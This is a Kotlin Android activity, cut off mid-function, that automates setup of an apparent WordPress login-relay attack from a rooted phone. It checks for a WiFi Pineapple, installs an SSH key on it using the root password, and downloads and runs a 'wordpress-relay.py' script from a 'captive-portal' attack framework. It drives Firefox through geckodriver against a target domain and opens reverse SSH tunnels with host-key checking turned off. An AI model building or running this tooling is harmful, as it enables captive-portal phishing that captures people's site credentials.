package com.example.wordpressrelayapp

import android.content.ActivityNotFoundException
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.text.method.ScrollingMovementMethod
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import android.os.PowerManager
import android.view.WindowManager
import java.util.concurrent.atomic.AtomicBoolean

class MainActivity : AppCompatActivity() {

    private val TERMUX_HOME = "/data/data/com.termux/files/home"
    private val TERMUX_BASH = "/data/data/com.termux/files/usr/bin/bash"
    private val SD_SCRIPT = "/sdcard/x11_start.sh"

    // Dynamic values to be populated
    private var termuxUid: String = ""
    private var termuxGid: String = ""
    private var termuxGroups: String = ""

    // Toggle state and control
    private val isRunning = AtomicBoolean(false)
    private var mainThread: Thread? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Keep screen on while app is open
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        val textView = findViewById<TextView>(R.id.textView)
        textView.movementMethod = ScrollingMovementMethod()

        val toggleButton = findViewById<Button>(R.id.button1)
        toggleButton.text = "START AUTO-SETUP"

        // Remove other buttons or hide them
        findViewById<Button>(R.id.button2).apply {
            visibility = android.view.View.GONE
        }
        findViewById<Button>(R.id.button3).apply {
            visibility = android.view.View.GONE
        }
        findViewById<Button>(R.id.button4).apply {
            visibility = android.view.View.GONE
        }

        // Detect Termux UID/GID on startup
        detectTermuxIds()

        toggleButton.setOnClickListener {
            if (isRunning.get()) {
                // Stop the process
                isRunning.set(false)
                mainThread?.interrupt()
                toggleButton.text = "START AUTO-SETUP"
                textView.append("\n\n❌ Auto-setup stopped by user\n")
            } else {
                // Start the process
                isRunning.set(true)
                toggleButton.text = "STOP AUTO-SETUP"
                textView.text = "🚀 Starting automated setup...\n\n"
                
                mainThread = Thread {
                    runAutomatedSetup(textView, toggleButton)
                }
                mainThread?.start()
            }
        }
    }

    private fun runAutomatedSetup(textView: TextView, toggleButton: Button) {
        try {
            // Prompt for domain FIRST before any setup steps
            appendLog(textView, "=== DOMAIN CONFIGURATION ===\n")
            val domain = promptForDomain(textView)
            if (domain == null) {
                appendLog(textView, "❌ Domain input cancelled - setup aborted\n")
                runOnUiThread {
                    isRunning.set(false)
                    toggleButton.text = "START AUTO-SETUP"
                }
                return
            }
            
            // Save the domain for future reference
            saveDomain(domain)
            appendLog(textView, "✅ Target domain: $domain\n\n")

            // Step 1: Check Termux installation
            if (!isRunning.get()) return
            appendLog(textView, "=== STEP 1: CHECKING TERMUX INSTALLATION ===\n")
            var step1Success = false
            var attempt = 1
            while (!step1Success && isRunning.get()) {
                appendLog(textView, "Attempt $attempt: Verifying Termux installation...\n")
                step1Success = checkTermuxInstallation(textView)
                if (!step1Success && isRunning.get()) {
                    appendLog(textView, "⚠️ Retrying in 5 seconds...\n\n")
                    Thread.sleep(5000)
                    attempt++
                }
            }
            if (!isRunning.get()) return
            appendLog(textView, "✅ Step 1 complete!\n\n")

            // Step 2: Test Pineapple connection
            if (!isRunning.get()) return
            appendLog(textView, "=== STEP 2: TESTING PINEAPPLE CONNECTION ===\n")
            var step2Success = false
            attempt = 1
            while (!step2Success && isRunning.get()) {
                appendLog(textView, "Attempt $attempt: Testing connection to Pineapple...\n")
                step2Success = testPineappleConnection(textView)
                if (!step2Success && isRunning.get()) {
                    appendLog(textView, "⚠️ Retrying in 10 seconds...\n\n")
                    Thread.sleep(10000)
                    attempt++
                }
            }
            if (!isRunning.get()) return
            appendLog(textView, "✅ Step 2 complete!\n\n")

            // Step 3: Setup prerequisites (SSH keys, scripts)
            if (!isRunning.get()) return
            appendLog(textView, "=== STEP 3: SETTING UP PREREQUISITES ===\n")
            var step3Success = false
            attempt = 1
            while (!step3Success && isRunning.get()) {
                appendLog(textView, "Attempt $attempt: Setting up SSH keys and scripts...\n")
                step3Success = setupPrerequisites(textView)
                if (!step3Success && isRunning.get()) {
                    appendLog(textView, "⚠️ Retrying in 10 seconds...\n\n")
                    Thread.sleep(10000)
                    attempt++
                }
            }
            if (!isRunning.get()) return
            appendLog(textView, "✅ Step 3 complete!\n\n")

            // Step 4: Start relay service with continuous monitoring and auto-recovery
            if (!isRunning.get()) return
            appendLog(textView, "=== STEP 4: STARTING RELAY SERVICE ===\n")
            
            // Continuous loop that will restart the service if it fails
            while (isRunning.get()) {
                var step4Success = false
                attempt = 1
                
                while (!step4Success && isRunning.get()) {
                    appendLog(textView, "Attempt $attempt: Starting relay service...\n")
                    step4Success = startRelayService(textView, domain)
                    
                    if (!step4Success && isRunning.get()) {
                        appendLog(textView, "⚠️ Retrying in 15 seconds...\n\n")
                        Thread.sleep(15000)
                        attempt++
                    }
                }
                
                if (!isRunning.get()) break
                
                appendLog(textView, "\n" + "=".repeat(50) + "\n")
                appendLog(textView, "✅ RELAY SERVICE STARTED SUCCESSFULLY!\n")
                appendLog(textView, "📊 Now monitoring Python output...\n")
                appendLog(textView, "Press STOP to terminate monitoring.\n")
                appendLog(textView, "=".repeat(50) + "\n\n")
                
                // Monitor the service - this will return if service fails
                val monitorResult = monitorPythonOutputWithHealthCheck(textView)
                
                if (!isRunning.get()) break
                
                // If we get here, the service failed
                if (monitorResult == MonitorResult.DNS_ERROR || monitorResult == MonitorResult.SERVICE_FAILED) {
                    appendLog(textView, "\n⚠️ Service failure detected! Restarting in 10 seconds...\n\n")
                    Thread.sleep(10000)
                    appendLog(textView, "=== RESTARTING STEP 4: RELAY SERVICE ===\n")
                } else {
                    // User stopped or unknown error
                    break
                }
            }

        } catch (e: InterruptedException) {
            appendLog(textView, "\n⚠️ Setup interrupted by user\n")
        } catch (e: Exception) {
            appendLog(textView, "\n❌ Fatal error: ${e.message}\n${e.stackTraceToString()}")
        } finally {
            runOnUiThread {
                isRunning.set(false)
                toggleButton.text = "START AUTO-SETUP"
            }
        }
    }

    enum class MonitorResult {
        USER_STOPPED,
        DNS_ERROR,
        SERVICE_FAILED,
        UNKNOWN_ERROR
    }

    private fun checkTermuxInstallation(textView: TextView): Boolean {
        try {
            val diagnostics = StringBuilder()
            
            // Check root access
            try {
                val rootProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
                val rootOutput = BufferedReader(InputStreamReader(rootProc.inputStream)).use { it.readText() }
                val rootExit = rootProc.waitFor()

                if (rootExit != 0) {
                    appendLog(textView, "❌ Root access not available\n")
                    return false
                }
                appendLog(textView, "✅ Root access confirmed\n")
            } catch (e: Exception) {
                appendLog(textView, "❌ Root check failed: ${e.message}\n")
                return false
            }

            // Check Termux installation
            val (success, errorMsg) = ensureTermuxIdsDetected()
            if (!success) {
                appendLog(textView, "❌ Termux not detected: $errorMsg\n")
                return false
            }
            appendLog(textView, "✅ Termux detected (UID: $termuxUid)\n")

            // Check Termux:X11
            val x11Proc = Runtime.getRuntime()
                .exec(arrayOf("su", "-c", "grep com.termux.x11 /data/system/packages.list"))
            val x11Exit = x11Proc.waitFor()

            if (x11Exit != 0) {
                appendLog(textView, "❌ Termux:X11 not found\n")
                return false
            }
            appendLog(textView, "✅ Termux:X11 detected\n")

            return true
        } catch (e: Exception) {
            appendLog(textView, "❌ Exception: ${e.message}\n")
            return false
        }
    }

    private fun testPineappleConnection(textView: TextView): Boolean {
        try {
            // Launch Termux to initialize environment
            try {
                val termuxLaunch = packageManager.getLaunchIntentForPackage("com.termux")
                    ?: Intent().apply {
                        setClassName("com.termux", "com.termux.app.TermuxActivity")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                startActivity(termuxLaunch)
                Thread.sleep(2000)
                val returnIntent = Intent(this@MainActivity, MainActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                }
                startActivity(returnIntent)
                Thread.sleep(500)
            } catch (e: Exception) {
                appendLog(textView, "⚠️ Could not launch Termux: ${e.message}\n")
            }

            val proc = Runtime.getRuntime().exec(
                arrayOf(
                    "su", termuxUid, "-c",
                    "timeout 15 ping -c 4 172.16.42.1"
                )
            )

            val output = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
            val exitCode = proc.waitFor()

            if (exitCode == 0) {
                appendLog(textView, "✅ Pineapple is reachable at 172.16.42.1\n")
                return true
            } else if (exitCode == 124) {
                appendLog(textView, "❌ Connection timed out after 15 seconds\n")
                return false
            } else {
                appendLog(textView, "❌ Pineapple is not reachable (exit: $exitCode)\n")
                return false
            }
        } catch (e: Exception) {
            appendLog(textView, "❌ Exception: ${e.message}\n")
            return false
        }
    }

    private fun setupPrerequisites(textView: TextView): Boolean {
        try {
            // Check existing files
            val checkScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=/data/data/com.termux/files/home
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                cd "${'$'}HOME"
                if [ -f .ssh/pineapple ]; then
                    echo 'SSH_KEY:EXISTS'
                else
                    echo 'SSH_KEY:MISSING'
                fi
                if [ -f wordpress-relay.py ]; then
                    echo 'SCRIPT:EXISTS'
                else
                    echo 'SCRIPT:MISSING'
                fi
            """.trimIndent()

            val checkScriptPath = "/sdcard/check_prereqs.sh"
            writeFileAsRoot(checkScriptPath, checkScript)
            execAsRoot("chmod 644 $checkScriptPath")

            val checkPipeline = "cat $checkScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val checkProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", checkPipeline))
            val checkOutput = BufferedReader(InputStreamReader(checkProc.inputStream)).use { it.readText() }
            checkProc.waitFor()

            val sshKeyExists = checkOutput.contains("SSH_KEY:EXISTS")
            val pythonScriptExists = checkOutput.contains("SCRIPT:EXISTS")

            var needToTransferKey = false

            // Generate SSH key if needed
            if (!sshKeyExists) {
                appendLog(textView, "📝 Generating SSH key pair...\n")
                val keygenSuccess = generateSshKeyPair(textView)
                if (!keygenSuccess) {
                    appendLog(textView, "❌ Failed to generate SSH key\n")
                    return false
                }
                appendLog(textView, "✅ SSH key pair generated\n")
                needToTransferKey = true

                // Prompt for password and transfer key
                val password = promptForPassword(textView, "SSH Password Required", 
                    "Enter SSH password for root@172.16.42.1 to transfer the newly generated key:")
                
                if (password == null) {
                    appendLog(textView, "❌ Password input cancelled\n")
                    return false
                }

                appendLog(textView, "⚙️ Transferring public key to Pineapple...\n")
                val transferSuccess = transferKeyWithPasswordAndRegenerate(password, textView)
                if (!transferSuccess) {
                    appendLog(textView, "❌ Failed to transfer SSH key\n")
                    return false
                }
                appendLog(textView, "✅ SSH key transferred successfully\n")
                needToTransferKey = false
            } else {
                appendLog(textView, "✅ SSH key already exists\n")
            }

            // Download Python script if needed
            if (!pythonScriptExists) {
                appendLog(textView, "📥 Downloading wordpress-relay.py...\n")
                val downloadScript = """
                    #!/data/data/com.termux/files/usr/bin/bash
                    set -e
                    export HOME=/data/data/com.termux/files/home
                    export PREFIX=/data/data/com.termux/files/usr
                    export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                    cd "${'$'}HOME"
                    wget -q https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/execution/wordpress-relay.py
                    if [ -f wordpress-relay.py ]; then
                        echo 'DOWNLOAD:SUCCESS'
                    else
                        echo 'DOWNLOAD:FAILED'
                    fi
                """.trimIndent()

                val downloadScriptPath = "/sdcard/download_script.sh"
                writeFileAsRoot(downloadScriptPath, downloadScript)
                execAsRoot("chmod 644 $downloadScriptPath")

                val downloadPipeline = "cat $downloadScriptPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                val downloadProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", downloadPipeline))
                val downloadOutput = BufferedReader(InputStreamReader(downloadProc.inputStream)).use { it.readText() }
                downloadProc.waitFor()

                if (!downloadOutput.contains("DOWNLOAD:SUCCESS")) {
                    appendLog(textView, "❌ Failed to download Python script\n")
                    return false
                }
                appendLog(textView, "✅ Python script downloaded\n")
            } else {
                appendLog(textView, "✅ Python script already exists\n")
            }

            // Verify SSH host key and connection
            if (!needToTransferKey) {
                appendLog(textView, "🔑 Verifying SSH connection...\n")
                val hostKeyVerified = verifySSHHostKey(textView)
                if (!hostKeyVerified) {
                    appendLog(textView, "❌ SSH host key verification failed\n")
                    return false
                }
                appendLog(textView, "✅ SSH connection verified\n")
            }

            return true
        } catch (e: Exception) {
            appendLog(textView, "❌ Exception: ${e.message}\n")
            return false
        }
    }

    private fun startRelayService(textView: TextView, domain: String): Boolean {
        try {
            appendLog(textView, "📝 Target domain: $domain\n")
            appendLog(textView, "⚙️ Creating startup script...\n")

            val scriptContent = """
                #!$TERMUX_BASH
                set -e

                export HOME=$TERMUX_HOME
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                export TMPDIR="${'$'}HOME/tmp"
                export DISPLAY=:0
                unset MOZ_HEADLESS
                export MOZ_CRASHREPORTER_DISABLE=1

                mkdir -p "${'$'}TMPDIR"
                cd "${'$'}HOME"

                echo "Cleaning up previous processes..." > cleanup.log
                pkill -9 -f python.*wordpress-relay || true
                pkill -9 -f geckodriver || true
                pkill -9 -f firefox || true
                pkill -9 -f termux-x11 || true
                pkill -f 'ssh.*172.16.42.1' || true

                echo "Cleaning up old log files..." >> cleanup.log
                rm -f python_output.log
                rm -f geckodriver.log
                rm -f firefox_test.log

                echo "Waiting for ports to be released..." >> cleanup.log
                for i in {1..10}; do
                    PORTS_IN_USE=0
                    nc -z 127.0.0.1 6000 2>/dev/null && PORTS_IN_USE=1
                    nc -z 127.0.0.1 4444 2>/dev/null && PORTS_IN_USE=1
                    nc -z 127.0.0.1 8080 2>/dev/null && PORTS_IN_USE=1
                    nc -z 127.0.0.1 9998 2>/dev/null && PORTS_IN_USE=1
                    
                    if [ "${'$'}PORTS_IN_USE" -eq 0 ]; then
                        echo "All ports released after ${'$'}i seconds" >> cleanup.log
                        break
                    fi
                    sleep 1
                done
                sleep 2

                echo "Starting X11 server..." > x11_output.log
                termux-x11 :0 -ac -listen tcp >> x11_output.log 2>&1 &
                X11_PID=${'$'}!
                sleep 3

                echo "Starting geckodriver..." >> x11_output.log
                geckodriver --port 4444 --log debug > geckodriver.log 2>&1 &
                GECKO_PID=${'$'}!
                sleep 3

                echo "Starting Python relay..." >> x11_output.log
                python -u "${'$'}HOME/wordpress-relay.py" --domain $domain --port 8080 > python_output.log 2>&1 &
                PYTHON_PID=${'$'}!

                # Wait for all ports
                ALL_PORTS_READY=0
                for attempt in {1..60}; do
                    if nc -z 127.0.0.1 6000 2>/dev/null && nc -z 127.0.0.1 4444 2>/dev/null && nc -z 127.0.0.1 8080 2>/dev/null; then
                        ALL_PORTS_READY=1
                        break
                    fi
                    sleep 1
                done

                if [ "${'$'}ALL_PORTS_READY" -eq 0 ]; then
                    echo "ERROR: Not all ports ready" >> x11_output.log
                    exit 1
                fi

                echo "Setting up SSH tunnels..." >> x11_output.log
                pkill -f 'ssh.*172.16.42.1' || true
                sleep 2

                nohup ssh -i ~/.ssh/pineapple -o StrictHostKeyChecking=no -o ConnectTimeout=10 -N -R 9999:localhost:8080 root@172.16.42.1 > ssh_forward1.log 2>&1 &
                sleep 3

                nohup ssh -i ~/.ssh/pineapple -o StrictHostKeyChecking=no -o ConnectTimeout=10 -N -L 9998:172.16.42.1:80 root@172.16.42.1 > ssh_forward2.log 2>&1 &
                sleep 3

                echo "Setup complete!" >> x11_output.log
            """.trimIndent()

            writeFileAsRoot(SD_SCRIPT, scriptContent)
            execAsRoot("chmod 644 $SD_SCRIPT")

            // Launch Termux
            try {
                val termuxLaunch = packageManager.getLaunchIntentForPackage("com.termux")
                    ?: Intent().apply {
                        setClassName("com.termux", "com.termux.app.TermuxActivity")
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                startActivity(termuxLaunch)
                Thread.sleep(1200)
                val returnIntent = Intent(this@MainActivity, MainActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                }
                startActivity(returnIntent)
            } catch (e: Exception) {
                appendLog(textView, "❌ Unable to launch Termux: ${e.message}\n")
                return false
            }

            val pipeline = "cat $SD_SCRIPT | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))

            appendLog(textView, "🚀 Services starting...\n")
            appendLog(textView, "⏳ Waiting for Python output log...\n")

            Thread.sleep(3000) // Give services more time to start

            // Wait for python_output.log to be created fresh and have content
            var logReady = false
            val maxWaitSeconds = 90 // Increased timeout
            val startTime = System.currentTimeMillis()
            var lastReportedTime = 0L

            while (!logReady && isRunning.get() && (System.currentTimeMillis() - startTime) < maxWaitSeconds * 1000) {
                val elapsed = (System.currentTimeMillis() - startTime) / 1000
                
                val checkScript = """
                    #!/data/data/com.termux/files/usr/bin/bash
                    export HOME=/data/data/com.termux/files/home
                    cd "${'$'}HOME"
                    if [ -f python_output.log ]; then
                        # Check if file has content (not just empty)
                        if [ -s python_output.log ]; then
                            echo "FILE_READY"
                        else
                            echo "FILE_EMPTY"
                        fi
                    else
                        echo "FILE_NOT_FOUND"
                    fi
                """.trimIndent()

                val checkPath = "/sdcard/check_python_log.sh"
                writeFileAsRoot(checkPath, checkScript)
                execAsRoot("chmod 644 $checkPath")

                val checkPipeline = "cat $checkPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
                val checkProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", checkPipeline))
                val checkOutput = BufferedReader(InputStreamReader(checkProc.inputStream)).use { it.readText() }.trim()
                checkProc.waitFor()

                when (checkOutput) {
                    "FILE_READY" -> {
                        logReady = true
                        appendLog(textView, "✅ Python output log detected and ready after ${elapsed}s!\n")
                    }
                    "FILE_EMPTY" -> {
                        if (elapsed - lastReportedTime >= 5) {
                            appendLog(textView, "Log file exists but empty... ${elapsed}s elapsed\n")
                            lastReportedTime = elapsed
                        }
                        Thread.sleep(1000)
                    }
                    else -> {
                        if (elapsed - lastReportedTime >= 5) {
                            appendLog(textView, "Still waiting for log file... ${elapsed}s elapsed\n")
                            lastReportedTime = elapsed
                        }
                        Thread.sleep(2000)
                    }
                }
            }

            if (!logReady) {
                appendLog(textView, "❌ Python output log not ready after $maxWaitSeconds seconds\n")
                appendLog(textView, "⚠️ Services may still be starting. Check manually if needed.\n")
                return false
            }

            // Give tail -f a moment to attach to the file
            Thread.sleep(1000)
            
            appendLog(textView, "✅ Service started, monitoring will begin...\n")
            return true
            
        } catch (e: Exception) {
            appendLog(textView, "❌ Exception: ${e.message}\n")
            return false
        }
    }

    private fun monitorPythonOutputWithHealthCheck(textView: TextView): MonitorResult {
        var shouldLaunchX11 = false
        var lastOutputTime = System.currentTimeMillis()
        val healthCheckInterval = 60000L // 60 seconds without output = potential issue (increased from 30)
        var hasReceivedFirstOutput = false
        
        try {
            val tailScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=/data/data/com.termux/files/home
                cd "${'$'}HOME"
                tail -f python_output.log
            """.trimIndent()

            val tailPath = "/sdcard/tail_python_log.sh"
            writeFileAsRoot(tailPath, tailScript)
            execAsRoot("chmod 644 $tailPath")

            val tailPipeline = "cat $tailPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val tailProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", tailPipeline))
            val reader = BufferedReader(InputStreamReader(tailProc.inputStream))

            val outputBuffer = StringBuilder()
            
            // Health check thread - only starts checking AFTER first output is received
            val healthCheckThread = Thread {
                while (isRunning.get()) {
                    Thread.sleep(5000) // Check every 5 seconds
                    
                    // Don't check health until we've received at least one line of output
                    if (!hasReceivedFirstOutput) {
                        continue
                    }
                    
                    val timeSinceLastOutput = System.currentTimeMillis() - lastOutputTime
                    
                    // If more than 60 seconds without output, check if process is still alive
                    if (timeSinceLastOutput > healthCheckInterval) {
                        val isAlive = checkPythonProcessAlive()
                        if (!isAlive) {
                            appendLog(textView, "\n⚠️ Python process appears to have stopped!\n")
                            tailProc.destroy()
                            break
                        }
                    }
                }
            }
            healthCheckThread.start()

            reader.use { input ->
                while (isRunning.get()) {
                    val line = input.readLine() ?: break
                    lastOutputTime = System.currentTimeMillis()
                    hasReceivedFirstOutput = true
                    outputBuffer.append(line).append("\n")

                    if (!shouldLaunchX11 && 
                        outputBuffer.contains("Firefox is ready! Waiting for login requests")) {
                        shouldLaunchX11 = true

                        handler.post {
                            try {
                                val x11Launch = packageManager.getLaunchIntentForPackage("com.termux.x11")
                                    ?: Intent().apply {
                                        setClassName("com.termux.x11", "com.termux.x11.MainActivity")
                                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                                    }
                                startActivity(x11Launch)
                            } catch (e: Exception) {
                                // Silently fail
                            }
                        }
                    }

                    // Check for DNS errors or critical failures
                    val lowerLine = line.lowercase()
                    if (lowerLine.contains("name or service not known") || 
                        lowerLine.contains("temporary failure in name resolution") ||
                        lowerLine.contains("dns") && lowerLine.contains("error")) {
                        appendLog(textView, line + "\n")
                        appendLog(textView, "\n❌ DNS ERROR DETECTED!\n")
                        tailProc.destroy()
                        healthCheckThread.interrupt()
                        return MonitorResult.DNS_ERROR
                    }
                    
                    if (lowerLine.contains("error") || lowerLine.contains("exception") || 
                        lowerLine.contains("failed") || lowerLine.contains("traceback")) {
                        // Log the error but check if it's critical
                        appendLog(textView, line + "\n")
                        
                        // Check for critical errors that should trigger restart
                        if (lowerLine.contains("critical") || lowerLine.contains("fatal") ||
                            lowerLine.contains("unable to connect") || lowerLine.contains("connection refused")) {
                            appendLog(textView, "\n❌ CRITICAL ERROR DETECTED!\n")
                            tailProc.destroy()
                            healthCheckThread.interrupt()
                            return MonitorResult.SERVICE_FAILED
                        }
                    } else {
                        appendLog(textView, line + "\n")
                    }

                    if (outputBuffer.length > 50000) {
                        outputBuffer.delete(0, outputBuffer.length - 40000)
                    }
                }
            }
            
            healthCheckThread.interrupt()
            tailProc.destroy()
            
            return if (isRunning.get()) MonitorResult.SERVICE_FAILED else MonitorResult.USER_STOPPED
            
        } catch (e: Exception) {
            appendLog(textView, "\n⚠️ Monitor exception: ${e.message}\n")
            return MonitorResult.UNKNOWN_ERROR
        }
    }

    private fun checkPythonProcessAlive(): Boolean {
        try {
            val checkScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=/data/data/com.termux/files/home
                pgrep -f "python.*wordpress-relay" > /dev/null
                if [ $? -eq 0 ]; then
                    echo "ALIVE"
                else
                    echo "DEAD"
                fi
            """.trimIndent()

            val checkPath = "/sdcard/check_python_alive.sh"
            writeFileAsRoot(checkPath, checkScript)
            execAsRoot("chmod 644 $checkPath")

            val pipeline = "cat $checkPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))
            val output = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
            proc.waitFor()

            return output.trim() == "ALIVE"
        } catch (e: Exception) {
            return false
        }
    }

    private fun verifySSHHostKey(textView: TextView): Boolean {
        try {
            val hostCheckScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                set +e
                export HOME=/data/data/com.termux/files/home
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                cd "${'$'}HOME"
                
                ssh -i .ssh/pineapple -o BatchMode=yes -o StrictHostKeyChecking=yes -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 root@172.16.42.1 true 2>/dev/null
                if [ $? -eq 0 ]; then
                    echo 'VERIFY:SUCCESS'
                    exit 0
                fi
                
                # Try to accept new host key
                ssh -i .ssh/pineapple -o BatchMode=yes -o StrictHostKeyChecking=accept-new -o ConnectTimeout=5 root@172.16.42.1 true 2>/dev/null
                
                # Verify again
                ssh -i .ssh/pineapple -o BatchMode=yes -o StrictHostKeyChecking=yes -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 root@172.16.42.1 true 2>/dev/null
                if [ $? -eq 0 ]; then
                    echo 'VERIFY:SUCCESS'
                else
                    echo 'VERIFY:FAILED'
                fi
            """.trimIndent()

            val hostCheckPath = "/sdcard/verify_ssh.sh"
            writeFileAsRoot(hostCheckPath, hostCheckScript)
            execAsRoot("chmod 644 $hostCheckPath")

            val pipeline = "cat $hostCheckPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))
            val output = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
            proc.waitFor()

            return output.contains("VERIFY:SUCCESS")
        } catch (e: Exception) {
            return false
        }
    }

    private fun saveDomain(domain: String) {
        try {
            val saveScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=/data/data/com.termux/files/home
                cd "${'$'}HOME"
                echo "$domain" > last-url.txt
            """.trimIndent()

            val savePath = "/sdcard/save_last_url.sh"
            writeFileAsRoot(savePath, saveScript)
            execAsRoot("chmod 644 $savePath")

            val pipeline = "cat $savePath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline)).waitFor()
        } catch (e: Exception) {
            // Ignore save failure
        }
    }

    private fun promptForDomain(textView: TextView): String? {
        // Try to load last URL to show as hint
        var lastUrl = ""
        try {
            val readScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=/data/data/com.termux/files/home
                cd "${'$'}HOME"
                if [ -f last-url.txt ]; then
                    cat last-url.txt
                fi
            """.trimIndent()

            val readPath = "/sdcard/read_last_url.sh"
            writeFileAsRoot(readPath, readScript)
            execAsRoot("chmod 644 $readPath")

            val pipeline = "cat $readPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))
            lastUrl = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }.trim()
            proc.waitFor()
        } catch (e: Exception) {
            // Continue without hint
        }

        var result: String? = null
        val latch = java.util.concurrent.CountDownLatch(1)

        runOnUiThread {
            val input = EditText(this@MainActivity)
            input.hint = "example.com"
            input.inputType = InputType.TYPE_TEXT_VARIATION_URI

            // Pre-fill with last used domain if available
            if (lastUrl.isNotEmpty()) {
                input.setText(lastUrl)
                input.selectAll()
            }

            val message = if (lastUrl.isNotEmpty()) {
                "Enter the WordPress domain (https:// will be added automatically):\n\nLast used: $lastUrl"
            } else {
                "Enter the WordPress domain (https:// will be added automatically):"
            }

            val dialog = android.app.AlertDialog.Builder(this@MainActivity)
                .setTitle("Enter WordPress Domain")
                .setMessage(message)
                .setView(input)
                .setPositiveButton("OK") { _, _ ->
                    var domain = input.text.toString().trim()
                    if (domain.isNotEmpty()) {
                        if (!domain.startsWith("http://") && !domain.startsWith("https://")) {
                            domain = "https://$domain"
                        }
                        result = domain
                    }
                    latch.countDown()
                }
                .setNegativeButton("Cancel") { _, _ ->
                    latch.countDown()
                }
                .setCancelable(false)
                .create()

            dialog.show()
        }

        latch.await()
        return result
    }

    private fun promptForPassword(textView: TextView, title: String, message: String): String? {
        var result: String? = null
        val latch = java.util.concurrent.CountDownLatch(1)

        runOnUiThread {
            val input = EditText(this@MainActivity)
            input.hint = "Password"
            input.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD

            val dialog = android.app.AlertDialog.Builder(this@MainActivity)
                .setTitle(title)
                .setMessage(message)
                .setView(input)
                .setPositiveButton("OK") { _, _ ->
                    result = input.text.toString()
                    latch.countDown()
                }
                .setNegativeButton("Cancel") { _, _ ->
                    latch.countDown()
                }
                .setCancelable(false)
                .create()

            dialog.show()
        }

        latch.await()
        return if (result.isNullOrEmpty()) null else result
    }

    private fun appendLog(textView: TextView, message: String) {
        runOnUiThread {
            textView.append(message)
            val scrollView = textView.parent as? android.widget.ScrollView
            scrollView?.post {
                scrollView.fullScroll(android.view.View.FOCUS_DOWN)
            }
        }
    }

    // Helper functions from original code
    private fun generateSshKeyPair(textView: TextView): Boolean {
        try {
            val keygenScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                set -e
                export HOME=/data/data/com.termux/files/home
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                cd "${'$'}HOME"
                mkdir -p .ssh
                ssh-keygen -t ed25519 -f .ssh/pineapple -N ''
                echo 'KEYGEN:SUCCESS'
            """.trimIndent()

            val keygenPath = "/sdcard/generate_key.sh"
            writeFileAsRoot(keygenPath, keygenScript)
            execAsRoot("chmod 644 $keygenPath")

            val pipeline = "cat $keygenPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))
            val output = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
            proc.waitFor()

            return output.contains("KEYGEN:SUCCESS")
        } catch (e: Exception) {
            return false
        }
    }

    private fun transferKeyWithPasswordAndRegenerate(password: String, textView: TextView): Boolean {
        try {
            val sshpassScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                set +e
                export HOME=/data/data/com.termux/files/home
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                cd "${'$'}HOME"
                
